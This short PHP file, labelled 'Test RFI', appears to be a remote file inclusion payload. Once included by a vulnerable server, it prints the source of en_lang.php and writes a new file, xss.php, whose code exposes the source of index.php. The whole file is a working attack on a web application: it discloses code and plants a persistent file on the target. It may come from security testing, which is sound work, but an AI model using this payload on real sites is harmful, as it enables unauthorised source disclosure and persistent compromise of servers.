<?php 
  echo "Test RFI"; 
  show_source('en_lang.php');

  $myfile = fopen("xss.php", "w") or die("Unable to open file!");
  $txt = "<?php show_source('index.php'); ?>";
  fwrite($myfile, $txt);
  fclose($myfile);
?>
